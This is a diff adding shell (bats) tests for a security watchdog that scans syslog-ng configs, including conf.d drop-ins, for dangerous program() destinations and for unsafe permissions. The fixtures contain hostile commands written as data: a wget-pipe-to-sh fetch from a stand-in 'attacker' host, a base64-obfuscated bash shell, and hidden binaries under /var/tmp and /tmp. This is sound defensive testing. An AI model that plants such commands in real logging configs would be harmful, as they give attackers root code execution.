@@ -148,3 +148,61 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — syslog-ng-exec inventory enumerates log-event-trigger root-exec surface)" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (wget-pipe-sh in program()): wget bootstrap → alert" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    printf 'destination d_evil { program("wget -qO- http://attacker/p | sh"); };\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in program()): obfuscation → alert" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    printf 'destination d_evil { program("echo YmFzaCAtaQ== | base64 -d | bash"); };\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (program() under /var/tmp): writable-root expansion" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    printf 'destination d_evil { program("/var/tmp/.attacker"); };\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (conf.d drop-in also scanned — not only main syslog-ng.conf)" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    printf 'destination d_dropin_evil { program("/tmp/.dropin-attacker"); };\n' > "${CONFD}/99-evil.conf"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable syslog-ng.conf itself → alert)" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    chmod 0666 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-syslog-ng-exec -- ')
+    [ "${main_count}" = "1" ]
+}
